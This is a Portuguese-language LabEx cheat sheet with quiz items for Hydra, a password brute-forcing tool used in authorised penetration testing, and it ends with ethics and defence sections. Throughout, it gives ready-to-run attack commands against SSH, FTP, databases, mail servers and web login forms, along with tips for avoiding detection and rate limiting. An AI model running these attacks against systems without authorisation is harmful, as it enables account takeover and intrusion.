---
title: 'Folha de Cola Hydra | LabEx'
description: 'Aprenda a quebrar senhas com Hydra usando esta folha de cola abrangente. Referência rápida para ataques de força bruta, auditoria de senhas, testes de segurança, protocolos de autenticação e ferramentas de pentest.'
pdfUrl: '/cheatsheets/pdf/hydra-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Folha de Dicas Hydra
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/pt/learn/hydra">Aprenda Hydra com Laboratórios Práticos</a>
</base-disclaimer-title>
<base-disclaimer-content>
Aprenda cracking de senhas com Hydra e testes de penetração através de laboratórios práticos e cenários do mundo real. O LabEx oferece cursos abrangentes sobre Hydra cobrindo ataques a protocolos, exploração de formulários web, otimização de desempenho e uso ético. Domine técnicas de força bruta para testes de segurança autorizados e avaliações de vulnerabilidade.
</base-disclaimer-content>
</base-disclaimer>

## Sintaxe Básica e Instalação

### Instalação: `sudo apt install hydra`

O Hydra geralmente vem pré-instalado no Kali Linux, mas pode ser instalado em outras distribuições.

```bash
# Instalar em sistemas Debian/Ubuntu
sudo apt install hydra
# Instalar em outros sistemas
sudo apt-get install hydra
# Verificar instalação
hydra -h
# Verificar protocolos suportados
hydra
```

### Sintaxe Básica: `hydra [opções] alvo serviço`

Sintaxe básica: `hydra -l <nome_de_usuário> -P <arquivo_de_senhas> <protocolo_alvo>://<endereço_alvo>`

```bash
# Nome de usuário único, lista de senhas
hydra -l username -P passwords.txt target.com ssh
# Lista de nomes de usuário, lista de senhas
hydra -L users.txt -P passwords.txt target.com ssh
# Nome de usuário único, senha única
hydra -l admin -p password123 192.168.1.100 ftp
```

<BaseQuiz id="hydra-syntax-1" correct="B">
  <template #question>
    Qual é a diferença entre `-l` e `-L` no Hydra?
  </template>
  
  <BaseQuizOption value="A">`-l` é para senhas, `-L` é para nomes de usuário</BaseQuizOption>
  <BaseQuizOption value="B" correct>`-l` especifica um nome de usuário único, `-L` especifica um arquivo de lista de nomes de usuário</BaseQuizOption>
  <BaseQuizOption value="C">Não há diferença</BaseQuizOption>
  <BaseQuizOption value="D">`-l` é minúsculo, `-L` é maiúsculo</BaseQuizOption>
  
  <BaseQuizAnswer>
    A opção `-l` é usada para um nome de usuário único, enquanto `-L` é usada para um arquivo contendo uma lista de nomes de usuário. Da mesma forma, `-p` é para uma senha única e `-P` é para um arquivo de lista de senhas.
  </BaseQuizAnswer>
</BaseQuiz>

### Opções Principais: `-l`, `-L`, `-p`, `-P`

Especifique nomes de usuário e senhas para ataques de força bruta.

```bash
# Opções de nome de usuário
-l username          # Nome de usuário único
-L userlist.txt      # Arquivo de lista de nomes de usuário
# Opções de senha
-p password          # Senha única
-P passwordlist.txt  # Arquivo de lista de senhas
# Localização comum de wordlists
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/unix_passwords.txt
```

### Opções de Saída: `-o`, `-b`

Salve os resultados em um arquivo para análise posterior.

```bash
# Salvar resultados no arquivo
hydra -l admin -P passwords.txt target.com ssh -o results.txt
# Formato de saída JSON
hydra -l admin -P passwords.txt target.com ssh -b json
# Saída detalhada (verbose)
hydra -l admin -P passwords.txt target.com ssh -V
```

<BaseQuiz id="hydra-output-1" correct="A">
  <template #question>
    O que o comando `hydra -V` faz?
  </template>
  
  <BaseQuizOption value="A" correct>Ativa a saída detalhada mostrando o progresso</BaseQuizOption>
  <BaseQuizOption value="B">Valida o arquivo da wordlist</BaseQuizOption>
  <BaseQuizOption value="C">Mostra a versão do Hydra</BaseQuizOption>
  <BaseQuizOption value="D">Executa apenas no modo detalhado</BaseQuizOption>
  
  <BaseQuizAnswer>
    O flag `-V` ativa o modo detalhado, que mostra a saída detalhada, incluindo cada tentativa de login, facilitando o monitoramento do progresso e a depuração de problemas durante os ataques de senha.
  </BaseQuizAnswer>
</BaseQuiz>

## Ataques Específicos de Protocolo

### SSH: `hydra alvo ssh`

Atacar serviços SSH com combinações de nome de usuário e senha.

```bash
# Ataque SSH básico
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
# Múltiplos nomes de usuário
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
# Porta SSH personalizada
hydra -l admin -P passwords.txt 192.168.1.100 -s 2222 ssh
# Com threading
hydra -l root -P passwords.txt -t 6 ssh://192.168.1.100
```

<BaseQuiz id="hydra-ssh-1" correct="C">
  <template #question>
    O que a flag `-s` faz no Hydra?
  </template>
  
  <BaseQuizOption value="A">Define o tipo de serviço</BaseQuizOption>
  <BaseQuizOption value="B">Ativa o modo furtivo (stealth)</BaseQuizOption>
  <BaseQuizOption value="C" correct>Especifica um número de porta personalizado</BaseQuizOption>
  <BaseQuizOption value="D">Define o número de threads</BaseQuizOption>
  
  <BaseQuizAnswer>
    A flag `-s` especifica um número de porta personalizado quando o serviço está rodando em uma porta não padrão. Por exemplo, `-s 2222` visa o SSH na porta 2222 em vez da porta padrão 22.
  </BaseQuizAnswer>
</BaseQuiz>

### FTP: `hydra alvo ftp`

Força bruta de credenciais de login FTP.

```bash
# Ataque FTP básico
hydra -l admin -P passwords.txt ftp://192.168.1.100
# Verificação de FTP anônimo
hydra -l anonymous -p "" ftp://192.168.1.100
# Porta FTP personalizada
hydra -l user -P passwords.txt -s 2121 192.168.1.100 ftp
```

### Ataques a Banco de Dados: `mysql`, `postgres`, `mssql`

Atacar serviços de banco de dados com força bruta de credenciais.

```bash
# Ataque MySQL
hydra -l root -P passwords.txt 192.168.1.100 mysql
# Ataque PostgreSQL
hydra -l postgres -P passwords.txt 192.168.1.100 postgres
# Ataque MSSQL
hydra -l sa -P passwords.txt 192.168.1.100 mssql
# Ataque MongoDB
hydra -l admin -P passwords.txt 192.168.1.100 mongodb
```

### SMTP/Email: `hydra alvo smtp`

Atacar a autenticação do servidor de e-mail.

```bash
# Força bruta SMTP
hydra -l admin -P passwords.txt smtp://mail.target.com
# Com senhas nulas/vazias
hydra -P passwords.txt -e ns -V -s 25 smtp.target.com smtp
# Ataque IMAP
hydra -l user -P passwords.txt imap://mail.target.com
```

## Ataques a Aplicações Web

### Formulários POST HTTP: `http-post-form`

Atacar formulários de login web usando o método HTTP POST com placeholders `^USER^` e `^PASS^`.

```bash
# Ataque de formulário POST básico
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# Com mensagem de erro personalizada
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid password"
# Com condição de sucesso
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/admin:username=^USER^&password=^PASS^:S=Dashboard"
```

### Formulários GET HTTP: `http-get-form`

Semelhante aos formulários POST, mas visa requisições GET.

```bash
# Ataque de formulário GET
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login:username=^USER^&password=^PASS^:F=Invalid"
# Com cabeçalhos personalizados
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/auth:user=^USER^&pass=^PASS^:F=Error:H=Cookie: session=abc123"
```

### Autenticação Básica HTTP: `http-get`/`http-post`

Atacar servidores web usando autenticação básica HTTP.

```bash
# Autenticação Básica HTTP
hydra -l admin -P passwords.txt http-get://192.168.1.100
# Autenticação Básica HTTPS
hydra -l admin -P passwords.txt https-get://secure.target.com
# Com caminho personalizado
hydra -l admin -P passwords.txt http-get://192.168.1.100/admin
```

### Ataques Web Avançados

Lidar com aplicações web complexas com tokens CSRF e cookies.

```bash
# Com tratamento de token CSRF
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^&csrf=^CSRF^:F=Error:H=Cookie: csrf=^CSRF^"
# Com cookies de sessão
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"
```

## Opções de Desempenho e Threading

### Threading: `-t` (Tarefas)

Controlar o número de conexões de ataque simultâneas durante o ataque.

```bash
# Threading padrão (16 tarefas)
hydra -l admin -P passwords.txt target.com ssh
# Contagem de threads personalizada
hydra -l admin -P passwords.txt -t 4 target.com ssh
# Ataque de alto desempenho (use com cautela)
hydra -l admin -P passwords.txt -t 64 target.com ssh
# Threading conservador (evitar detecção)
hydra -l admin -P passwords.txt -t 1 target.com ssh
```

### Tempo de Espera: `-w` (Atraso)

Adicionar atrasos entre as tentativas para evitar limitação de taxa e detecção.

```bash
# Espera de 30 segundos entre as tentativas
hydra -l admin -P passwords.txt -w 30 target.com ssh
# Combinado com threading
hydra -l admin -P passwords.txt -t 2 -w 10 target.com ssh
# Atraso aleatório (1-5 segundos)
hydra -l admin -P passwords.txt -W 5 target.com ssh
```

### Múltiplos Alvos: `-M` (Arquivo de Alvos)

Atacar múltiplos hosts especificando-os em um arquivo.

```bash
# Criar arquivo de alvos
echo "192.168.1.100" > targets.txt
echo "192.168.1.101" >> targets.txt
echo "192.168.1.102" >> targets.txt
# Atacar múltiplos alvos
hydra -L users.txt -P passwords.txt -M targets.txt ssh
# Com threading personalizado por alvo
hydra -L users.txt -P passwords.txt -M targets.txt -t 2 ssh
```

### Opções de Retomada e Parada

Retomar ataques interrompidos e controlar o comportamento de parada.

```bash
# Parar após o primeiro sucesso
hydra -l admin -P passwords.txt -f target.com ssh
# Retomar ataque anterior
hydra -R
# Criar arquivo de restauração
hydra -l admin -P passwords.txt -I restore.txt target.com ssh
```

## Recursos Avançados e Opções

### Geração de Senhas: `-e` (Testes Adicionais)

Testar variações de senha adicionais automaticamente.

```bash
# Testar senhas nulas
hydra -l admin -e n target.com ssh
# Testar nome de usuário como senha
hydra -l admin -e s target.com ssh
# Testar nome de usuário reverso
hydra -l admin -e r target.com ssh
# Combinar todas as opções
hydra -l admin -e nsr -P passwords.txt target.com ssh
```

### Formato Separado por Dois Pontos: `-C`

Usar combinações de nome de usuário:senha para reduzir o tempo de ataque.

```bash
# Criar arquivo de credenciais
echo "admin:admin" > creds.txt
echo "root:password" >> creds.txt
echo "user:123456" >> creds.txt
# Usar formato de dois pontos
hydra -C creds.txt target.com ssh
# Mais rápido do que testar todas as combinações
```

### Suporte a Proxy: `HYDRA_PROXY`

Usar servidores proxy para ataques com variáveis de ambiente.

```bash
# Proxy HTTP
export HYDRA_PROXY=connect://proxy.example.com:8080
hydra -l admin -P passwords.txt target.com ssh
# Proxy SOCKS4 com autenticação
export HYDRA_PROXY=socks4://user:pass@127.0.0.1:1080
# Proxy SOCKS5
export HYDRA_PROXY=socks5://proxy.example.com:1080
```

### Otimização da Lista de Senhas: `pw-inspector`

Usar pw-inspector para filtrar listas de senhas com base em políticas.

```bash
# Filtrar senhas (mínimo 6 caracteres, 2 classes de caracteres)
cat passwords.txt | pw-inspector -m 6 -c 2 -n > filtered.txt
# Usar lista filtrada com Hydra
hydra -l admin -P filtered.txt target.com ssh
# Remover duplicatas primeiro
cat passwords.txt | sort | uniq > unique_passwords.txt
```

## Uso Ético e Melhores Práticas

### Diretrizes Legais e Éticas

É possível usar o Hydra tanto de forma legal quanto ilegal. Obtenha permissão e aprovação apropriadas antes de realizar ataques de força bruta.

```text
Realize ataques apenas em sistemas onde permissão explícita foi obtida
Sempre garanta que você tem permissão explícita do proprietário ou administrador do sistema
Documente todas as atividades de teste para conformidade
Use apenas durante testes de penetração autorizados
Nunca use para tentativas de acesso não autorizadas
```

### Medidas Defensivas

Defenda-se contra ataques de força bruta com senhas fortes e políticas.

```text
Implemente políticas de bloqueio de conta para bloquear temporariamente contas após tentativas falhas
Use autenticação multifator (MFA)
Implemente sistemas CAPTCHA para prevenir ferramentas de automação
Monitore e registre tentativas de autenticação
Implemente limitação de taxa e bloqueio de IP
```

### Melhores Práticas de Teste

Comece com configurações conservadoras e documente todas as atividades para transparência.

```text
Comece com contagens baixas de threads para evitar interrupção do serviço
Use wordlists apropriadas para o ambiente alvo
Teste durante janelas de manutenção aprovadas, quando possível
Monitore o desempenho do sistema alvo durante o teste
Tenha procedimentos de resposta a incidentes prontos
```

### Casos de Uso Comuns

Equipes vermelhas e azuis se beneficiam de auditorias de senhas, avaliações de segurança e testes de penetração.

```text
Cracking de senhas para identificar senhas fracas e avaliar a força da senha
Auditorias de segurança de serviços de rede
Testes de penetração e avaliações de vulnerabilidade
Testes de conformidade para políticas de senha
Demonstrações de treinamento e educacionais
```

## Alternativa de GUI e Ferramentas Adicionais

### XHydra: Interface Gráfica

O XHydra é uma GUI para o Hydra que permite selecionar a configuração a partir de controles via GUI em vez de switches de linha de comando.

```bash
# Iniciar GUI do XHydra
xhydra
# Instalar se não estiver disponível
sudo apt install hydra-gtk
# Funcionalidades:
# - Interface ponto-e-clique
# - Modelos de ataque pré-configurados
# - Monitoramento visual de progresso
# - Seleção fácil de alvo e wordlist
```

### Hydra Wizard: Configuração Interativa

Assistente interativo que guia os usuários pela configuração do hydra com perguntas simples.

```bash
# Iniciar assistente interativo
hydra-wizard
# O assistente pergunta sobre:
# 1. Serviço a ser atacado
# 2. Alvo a ser atacado
# 3. Nome de usuário ou arquivo de nome de usuário
# 4. Senha ou arquivo de senha
# 5. Testes de senha adicionais
# 6. Número da porta
# 7. Confirmação final
```

### Listas de Senhas Padrão: `dpl4hydra`

Gera listas de senhas padrão para marcas e sistemas específicos.

```bash
# Atualizar banco de dados de senhas padrão
dpl4hydra refresh
# Gerar lista para marca específica
dpl4hydra cisco
dpl4hydra netgear
dpl4hydra linksys
# Usar listas geradas
hydra -C dpl4hydra_cisco.lst 192.168.1.1 ssh
# Todas as marcas
dpl4hydra all
```

### Integração com Outras Ferramentas

Combine o Hydra com ferramentas de reconhecimento e enumeração.

```bash
# Combinar com descoberta de serviço Nmap
nmap -sV 192.168.1.0/24 | grep -E "(ssh|ftp|http)"
# Usar com resultados de enumeração de nomes de usuário
enum4linux 192.168.1.100 | grep "user:" > users.txt
# Integrar com wordlists do Metasploit
ls /usr/share/wordlists/metasploit/
```

## Solução de Problemas e Desempenho

### Problemas Comuns e Soluções

Resolva problemas típicos encontrados durante o uso do Hydra.

```bash
# Erros de tempo limite de conexão
hydra -l admin -P passwords.txt -t 1 -w 30 target.com ssh
# Erro de muitas conexões
hydra -l admin -P passwords.txt -t 2 target.com ssh
# Otimização do uso de memória
hydra -l admin -P small_list.txt target.com ssh
# Verificar protocolos suportados
hydra
# Procurar protocolo na lista de serviços suportados
```

### Otimização de Desempenho

Otimize listas de senhas e ordene por probabilidade para resultados mais rápidos.

```bash
# Ordenar senhas por probabilidade
hydra -l admin -P passwords.txt -u target.com ssh
# Remover duplicatas
sort passwords.txt | uniq > clean_passwords.txt
# Otimizar threading com base no alvo
# Rede local: -t 16
# Alvo de Internet: -t 4
# Serviço lento: -t 1
```

### Formatos de Saída e Análise

Diferentes formatos de saída para análise de resultados e relatórios.

```bash
# Saída de texto padrão
hydra -l admin -P passwords.txt target.com ssh -o results.txt
# Formato JSON para análise
hydra -l admin -P passwords.txt target.com ssh -b json -o results.json
# Saída detalhada para depuração
hydra -l admin -P passwords.txt target.com ssh -V
# Saída apenas de sucesso
hydra -l admin -P passwords.txt target.com ssh | grep "password:"
```

### Monitoramento de Recursos

Monitore os recursos do sistema e da rede durante os ataques.

```bash
# Monitorar uso da CPU
top -p $(pidof hydra)
# Monitorar conexões de rede
netstat -an | grep :22
# Monitorar uso de memória
ps aux | grep hydra
# Limitar impacto no sistema
nice -n 19 hydra -l admin -P passwords.txt target.com ssh
```

## Links Relevantes

- <router-link to="/kali">Folha de Dicas Kali Linux</router-link>
- <router-link to="/cybersecurity">Folha de Dicas de Cibersegurança</router-link>
- <router-link to="/nmap">Folha de Dicas Nmap</router-link>
- <router-link to="/wireshark">Folha de Dicas Wireshark</router-link>
- <router-link to="/comptia">Folha de Dicas CompTIA</router-link>
- <router-link to="/linux">Folha de Dicas Linux</router-link>
- <router-link to="/shell">Folha de Dicas Shell</router-link>
- <router-link to="/devops">Folha de Dicas DevOps</router-link>
